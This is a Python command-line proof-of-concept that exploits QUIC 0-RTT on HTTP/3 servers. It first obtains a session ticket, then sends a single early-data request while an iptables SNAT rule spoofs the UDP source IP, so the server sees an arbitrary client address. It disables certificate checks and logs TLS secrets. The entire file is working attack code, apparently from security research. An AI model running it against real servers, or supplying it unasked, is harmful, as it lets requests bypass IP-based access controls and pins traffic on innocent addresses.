import asyncio
import contextlib
import dataclasses
import logging
from pathlib import Path
from urllib.parse import urlparse, ParseResult as URL
import ssl
import subprocess
from typing import Optional, cast

from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnectionState
from aioquic.quic.events import QuicEvent
from aioquic.tls import SessionTicket
import click


logging.basicConfig(level=logging.INFO)
log = logging.getLogger("client")


@dataclasses.dataclass
class HttpRequest:
    url: URL
    method: str = 'GET'
    headers: dict = dataclasses.field(default_factory=dict)
    data: bytes = b''


class HttpClient(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.http: Optional[H3Connection] = H3Connection(self._quic)

    def quic_event_received(self, event: QuicEvent) -> None:
        # pass event to the HTTP layer
        if self.http is not None:
            for http_event in self.http.handle_event(event):
                self.http_event_received(http_event)


@contextlib.asynccontextmanager
async def iptables_ip_spoofing(victim_ip='127.0.0.1', victim_port='443', spoofed_source_ip='1.3.3.7'):
    # IP spoofing via iptables: rewrite source IP
    iptables_command = [
        'iptables',
        '--append', 'POSTROUTING',
        '--table', 'nat',
        '--protocol', 'udp',
        f'--destination', victim_ip,
        f'--dport', str(victim_port),
        '--jump', 'SNAT',
        f'--to-source', spoofed_source_ip,
    ]
    try:
        log.info('Setting up iptables rule for source IP spoofing')
        subprocess.run(iptables_command)

        yield
    finally:
        log.info('Cleaning up iptables rule for source IP spoofing')
        iptables_command[1] = '--delete'
        subprocess.run(iptables_command)


@contextlib.asynccontextmanager
async def connect_h3(url: URL, session_ticket=None, **kwargs):
    configuration = QuicConfiguration(
        is_client=True,
        alpn_protocols=H3_ALPN,
        verify_mode=ssl.CERT_NONE,
        server_name=url.hostname,
        secrets_log_file=(Path(__file__).parent.parent / 'quic_secrets.log').open('a'),
        session_ticket=session_ticket,
    )
    async with connect(
        host=url.hostname,
        port=url.port or 443,
        configuration=configuration,
        create_protocol=HttpClient,
        **kwargs,
    ) as client:
        yield client


async def get_session_ticket(url: URL):
    # Connect to server and store session ticket for 0-RTT
    log.info('Initially connecting to server to get a session ticket')
    session_tickets = []
    async with connect_h3(
        url=url,
        session_ticket_handler=lambda t: session_tickets.append(t),
        wait_connected=True 
    ):
        # Wait some time for the session ticket to be received
        await asyncio.sleep(1)
    log.info('Initial connection done')

    return session_tickets[-1] if len(session_tickets) > 0 else None


async def http_ip_spoofing(request: HttpRequest, spoofed_ip: str, session_ticket: SessionTicket):
    log.info('Building 0-RTT QUIC packet')
    async with connect_h3(
        url=request.url, 
        session_ticket=session_ticket, 
        wait_connected=False
    ) as client:
        client = cast(HttpClient, client)

        # Build HTTP/3 request
        stream_id = client._quic.get_next_available_stream_id()
        client.http.send_headers(
            stream_id=stream_id,
            headers=[
                (b":method", request.method.encode()),
                (b":scheme", request.url.scheme.encode()),
                (b":authority", request.url.netloc.encode()),
                (b":path", ((request.url.path or '/') + (f'?{request.url.query}' if request.url.query else '')).encode()),
            ] + [(k.lower().encode(), v.encode()) for (k, v) in request.headers.items()],
            end_stream=not request.data,
        )
        if request.data:
            client.http.send_data(
                stream_id=stream_id,
                data=request.data,
                end_stream=True
            )
        
        # Send UDP datagram
        datagrams = client._quic.datagrams_to_send(now=client._loop.time())
        assert len(datagrams) == 1, 'Request does not fit into 1 UDP packet'
        data, addr = datagrams[0]
        async with iptables_ip_spoofing(victim_ip=addr[0].removeprefix('::ffff:'), victim_port=addr[1], spoofed_source_ip=spoofed_ip):
            log.info('Sending 0-RTT packet')
            client._transport.sendto(data, addr)

        # Mark connection as closed
        client._quic._state = QuicConnectionState.TERMINATED
        client._closed.set()


async def main(url, spoofed_ip, method='GET', data=None, header=None) -> None:
    session_ticket = await get_session_ticket(url)
    assert session_ticket is not None, 'Server does not support 0-RTT: no session ticket received'
    assert session_ticket.max_early_data_size and session_ticket.max_early_data_size > 0, 'Server does not support 0-RTT early data: max_early_data_size == 0'

    data = data.encode() if data else None
    headers = dict(h.split(': ', 1) for h in header or [])
    spoofed_request = HttpRequest(
        url=url,
        method=method,
        data=data,
        headers=
            ({'Content-Length': str(len(data))} if data else {}) |
            ({'Content-Type': 'application/x-www-form-urlencoded'} if data and 'Content-Type' not in headers else {}) |
            headers,
    )
    await http_ip_spoofing(request=spoofed_request, spoofed_ip=spoofed_ip, session_ticket=session_ticket)


@click.command()
@click.argument('url', type=urlparse)
@click.option('--spoofed-ip', type=str, default='1.3.3.7')
@click.option('-X', '--method', type=str, default='GET')
@click.option('-d', '--data', type=str, default=None)
@click.option('-H', '--header', type=str, multiple=True)
def cli_main(*args, **kwargs):
    asyncio.run(main(*args, **kwargs))

if __name__ == "__main__":
    cli_main()
